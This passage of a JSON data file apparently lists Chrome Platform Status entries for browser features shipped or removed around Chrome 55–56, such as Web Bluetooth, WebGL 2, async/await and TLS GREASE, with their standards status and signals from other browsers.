          "milestone_str": 56
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/626086",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://msdn.microsoft.com/en-ca/library/windows/apps/hh767313.aspx",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Support the touch-action: pinch-zoom CSS property. \r\n\r\nThe user agent MAY consider touches that begin on the element for the purposes of continuous zooming and immediately execute the default action instead of waiting for an event handler to not cancel it.\r\n",
    "id": 5670200775016448,
    "resources": {
      "docs": [
        "https://github.com/w3c/pointerevents/issues/29",
        ""
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-08-11 16:44:37.119010",
      "by": "ericbidelman@google.com"
    },
    "name": "Treat Document Level Touch Event Listeners as Passive",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 56
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://crbug.com/639227",
        "intervention": true
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "AddEventListenerOptions defaults passive to false. With this change touchstart and touchmove listeners added to the document will default to passive:true (so that calls to preventDefault will be ignored)..\r\n\r\nIf the value is explicitly provided in the AddEventListenerOptions it will continue having the value specified by the page.\r\n\r\nThis is behind a flag starting in Chrome 54, and enabled by default in Chrome 56. See https://developers.google.com/web/updates/2017/01/scrolling-intervention",
    "id": 5093566007214080,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/01/scrolling-intervention",
        "https://docs.google.com/document/d/1II7oSIpd8pK91V5kEM3tDLKcIj398jOJn8Niqy6_loI/edit",
        "https://docs.google.com/document/d/1mlUcJZHLyz1fip7CNEiU0w7JgcxBZUilvOwg0i9ZvQc/edit",
        "https://github.com/WICG/interventions/issues/18"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:29:10.765660",
      "by": "ericbidelman@google.com"
    },
    "name": "User gesture for touch scrolling",
    "tags": [
      "touchstart",
      "touchmove",
      "pop-up blocker"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#triggered-by-user-activation",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink>Input"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=611981",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "No longer allow opening pop-ups (and other sensitive operations) to occur during input events which represent a touch scroll.  In particular, touchstart and touchmove listeners now never have a user gesture.  touchend listeners do have a user gesture unless the user was scrolling / pinching.\r\n\r\nBuilds on https://www.chromestatus.com/feature/5649871251963904.\r\n",
    "id": 6131337345892352,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/13",
        "https://docs.google.com/document/d/1oF1T3O7_E4t1PYHV6gyCwHxOi3ystm0eSL5xZu7nvOg/edit"
      ],
      "samples": [
        "http://output.jsbin.com/kibaxu"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:38.446580",
      "by": "ericbidelman@google.com"
    },
    "name": "Web Bluetooth API",
    "tags": [
      "btle",
      "ble",
      "bluetooth"
    ],
    "comments": "Intent to Ship: https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/Ono3RWkejAA/2skvuBhSCQAJ\r\n\r\nBehind chrome://flags/#enable-experimental-web-platform-features in Linux.\r\n\r\nOrigin Trial Experiment: M53 - M55, Stable channel: Sept 6 - Jan 24.\r\n\r\nThe API is only partially implemented.\r\nSee https://github.com/WebBluetoothCG/web-bluetooth/blob/master/implementation-status.md for which pieces are done in which releases.\r\n\r\nStatus in Opera for Android: in development.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://webbluetoothcg.github.io/web-bluetooth/",
      "visibility": {
        "text": "Likely in mainstream tech news",
        "val": 1
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1204396",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "jyasskin@chromium.org",
          "scheib@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Bluetooth"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=419413",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/webbluetooth/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=101034",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Allows web sites to communicate over GATT with nearby user-selected Bluetooth devices in a secure and privacy-preserving way.",
    "id": 5264933985976320,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2015/07/interact-with-ble-devices-on-the-web",
        "https://www.w3.org/community/web-bluetooth/",
        "https://developer.mozilla.org/en-US/docs/Web/API/Web_Bluetooth_API"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/web-bluetooth/",
        "https://github.com/WebBluetoothCG/demos"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:49.775860",
      "by": "ericbidelman@google.com"
    },
    "name": "Web MIDI MIDIMessageEvent.receivedTime deprecation",
    "comments": "Will start showing message on M-54, and remove the attribute on M-56.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-midi-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1201590",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 56
        },
        "owners": [
          "toyoshim@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/599335",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Deprecate receivedTime property from MIDIMessageEvent.\r\n\r\nThis is because the attribute was introduced to represent a high-resolution timestamp for real-time MIDI processing, but DOM Event started using hi-resolution monotonic time instead of epoch time for Event.timeStamp that can cover our use-case too.\r\n",
    "id": 5665772797952000,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-midi-api/issues/145"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:46.708920",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Add ConstantSourceNode",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "rtoy@chromium.org",
          "hongchan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "ios": 56,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/644438",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add a new ConstantSourceNode that produces a constant output mixed with an AudioParam.  This node serves as a constant source and also as a \"constructible AudioParam\"",
    "id": 5647701588836352,
    "resources": {
      "docs": [
        "https://www.chromestatus.com/features/5647701588836352",
        "https://github.com/WebAudio/web-audio-api/pull/902",
        "https://github.com/WebAudio/web-audio-api/issues/367"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:29.849240",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: ChannelSplitterNode channelCount and channelCountMode are constant",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "ios": 56,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/653234",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The channelCount and channelCountMode attributes for a ChannelSplitterNode are fixed to the number of outputs and \"explicit\", respectively.\r\n\r\nThey cannot be changed.",
    "id": 4701085050601472,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#the-channelsplitternode-interface",
        "https://webaudio.github.io/web-audio-api/#widl-AudioNode-channelCount",
        "https://webaudio.github.io/web-audio-api/#widl-AudioNode-channelCountMode"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:33.637330",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: PannerNode.rolloffFactor clamps to nominal range.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "ios": 56,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/652712",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The PannerNode.rolloffFactor clamps to the nominal range which depends on the distance model being used.",
    "id": 4939796648558592,
    "resources": {
      "docs": [
        "https://webaudio.github.io/web-audio-api/#widl-PannerNode-rolloffFactor"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:03.331700",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Remove Doppler API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 56,
        "ios": 56,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 56,
        "flag": false,
        "android": 56,
        "bug": "http://crbug.com/439644",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Remove the deprecated Doppler API.  This includes removing speedOfSound, dopplerFactor, and setVelocity from the WebAudio API. This was removed from the WebAudio spec quite a while ago. The actual effect was removed a while ago, but the API remained.  The API is being removed now.",
    "id": 5753252045914112,
    "resources": {}
  },
  {
    "category": "Graphics",
    "updated": {
      "when": "2017-06-14 18:29:17.767850",
      "by": "ericbidelman@google.com"
    },
    "name": "WebGL 2",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.khronos.org/registry/webgl/specs/latest/2.0/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 56
        },
        "owners": [
          "kbr@chromium.org",
          "zmo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 58,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "android": 58,
        "bug": "http://crbug.com/641635",
        "intervention": false
      },
      "opera": {
        "android": 43,
        "desktop": 43
      },
      "edge": {
        "view": {
          "url": "https://dev.modern.ie/platform/status/webgl20",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "OpenGL ES 3.0 level rendering capabilities via the <canvas> element.",
    "id": 6694359164518400,
    "resources": {
      "docs": [
        "https://www.khronos.org/webgl/wiki/Getting_a_WebGL_Implementation"
      ],
      "samples": [
        "https://www.khronos.org/webgl/wiki/Getting_a_WebGL_Implementation"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:44.717550",
      "by": "ericbidelman@google.com"
    },
    "name": "window.prompt() will not activate parent page",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 56
        },
        "owners": [
          "avi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 56,
        "flag": false,
        "bug": "http://crbug.com/629964",
        "intervention": true
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "If a document in a background tab calls window.prompt() then the call to prompt() will return immediately, and no dialog will be shown to the user for that call to prompt(). If the tab is foremost (if it is the active tab in the front window), then the call will show a dialog. Specifically, this removes the ability to use window.prompt() to bring a tab to the front against the user’s will.\r\n",
    "id": 5637107137642496,
    "resources": {
      "docs": [
        "http://bit.ly/project-oldspice"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-07-19 22:00:35.874340",
      "by": "gsathya@chromium.org"
    },
    "first_of_milestone": true,
    "name": "Async/await functions",
    "tags": [
      "async",
      "await",
      "asynchronous"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tc39.github.io/ecmascript-asyncawait/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1185106",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "littledan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/v8/issues/detail?id=4483",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/asyncfunctionses2016",
          "text": "In development",
          "val": 2
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=156147",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Async functions make it easy to write code which needs to \"block\" on certain asynchronous events JavaScript. Async/await does this by providing a simpler and more ergonomic way to use Promises. To block on a value, use the 'await' keyword. Async/await can be implemented based on a desugaring to generators, as described in the following design doc: https://docs.google.com/document/d/1K38ct2dsxG_9OfmgErvFld4MPDC4Wkr8tPuqmSWu_3Y/edit?usp=sharing",
    "id": 5643236399906816,
    "resources": {
      "docs": [
        "https://developers.google.com/web/fundamentals/getting-started/primers/async-functions",
        "https://jakearchibald.com/2014/es7-async-functions/"
      ],
      "samples": [
        "https://blogs.msdn.microsoft.com/eternalcoding/2015/09/30/javascript-goes-to-asynchronous-city"
      ]
    }
  },
  {
    "category": "Device",
    "updated": {
      "when": "2017-06-14 18:28:52.580480",
      "by": "ericbidelman@google.com"
    },
    "name": "Block navigator.vibrate in cross-origin iframes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1243431",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 55
        },
        "owners": [
          "binlu@google.com",
          "kenjibaheux@chromium.org",
          "ojan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "flag": false,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=625044",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Calls to navigator.vibrate will immediately return 'false' inside cross-origin iframes.The Vibrate API is being abused by unsafe third-party content (eg., malicious ads).\r\n\r\nAs of Chrome 57 this is relaxed to allow vibration after the user has tapped on the frame.  See https://crbug.com/683938.",
    "id": 5682658461876224,
    "resources": {
      "docs": [
        "https://github.com/WICG/interventions/issues/25"
      ],
      "samples": [
        "http://output.jsbin.com/murono"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:09.620170",
      "by": "ericbidelman@google.com"
    },
    "name": "Block script execution for non-script MIME types.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://fetch.spec.whatwg.org/#should-response-to-request-be-blocked-due-to-mime-type?",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1048535",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/433049",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Script should not execute if it is delivered with a MIME type of 'audio/*', 'image/*', 'video/*', or 'text/csv'.",
    "id": 6031053726679040,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:45.813250",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS hyphens property",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-text-3/#propdef-hyphens",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "kojii@chromium.org",
          "drott@chromium.org",
          "szager@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "http://crbug.com/605840",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://caniuse.com/#search=hyphens",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "This CSS property controls automatic hyphenations. The automatic hyphenation is strongly demanded as seen in crbug.com/47083, and is already supported by all other major browsers.\r\n\r\nBlink enables the following values on all platforms:\r\n\r\n\"manual\" - the initial value.\r\n\"none\" - disables soft hyphens.\r\n\r\nand the following value on Android and Mac:\r\n\r\n\"auto\" - enables the automatic hyphenation for languages where the underlying operating system has dictionaries.",
    "id": 5642121184804864,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1ZgMnNxYxvPJYMOeyxJs8MsfGMNFiDKrz64AySxlCzpk/edit?usp=sharing",
        "https://developer.mozilla.org/en-US/docs/Web/CSS/hyphens"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/css-hyphens/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:54.883010",
      "by": "ericbidelman@google.com"
    },
    "name": "EME: onwaitingforkey, onkeystatuseschange, & onmessage event handler attributes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/encrypted-media/#dom-mediakeysession-onkeystatuseschange",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-html-media/2016Sep/0113.html",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "ddorwin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=635693",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "url": "https://github.com/w3c/encrypted-media/issues/176#issuecomment-223447726",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Add the following EventHandler attributes for existing EME events:\r\n* HTMLMediaElement:\r\n  * onwaitingforkey\r\n  * (onencrypted is already implemented)\r\n* MediaKeySession:\r\n  * onkeystatuseschange\r\n  * onmessage\r\n",
    "id": 5696471747788800,
    "resources": {
      "docs": [
        "Spec issue: https://github.com/w3c/encrypted-media/issues/176"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:29:14.923960",
      "by": "ericbidelman@google.com"
    },
    "name": "GREASE for TLS",
    "tags": [
      "tls",
      "ssl",
      "grease"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 5
      },
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 55
        },
        "owners": [
          "davidben@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=648327",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "TLS clients offer lists of 16-bit code points (e.g. cipher suites) that servers select from. To remain extensible, servers must ignore unknown values. However, servers may have bugs and reject unknown values. These servers will interoperate with existing clients, so the mistake may spread unnoticed, breaking extensibility for the whole ecosystem. We will reserve some values to advertise at random, to prevent such mistakes before broken servers are widespread.",
    "id": 6475903378915328,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:44.052440",
      "by": "ericbidelman@google.com"
    },
    "name": "HTTP/0.9 over non-default ports",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/rfc1945",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 55
        },
        "owners": [
          "mmenke@chomium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 55,
        "ios": 55,
        "blink_components": [
          "Blink"
        ],
        "desktop": 55,
        "flag": false,
        "android": 55,
        "bug": "https://crbug.com/624462",
        "intervention": false
      },
      "opera": {
        "android": 42,
        "desktop": 42
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
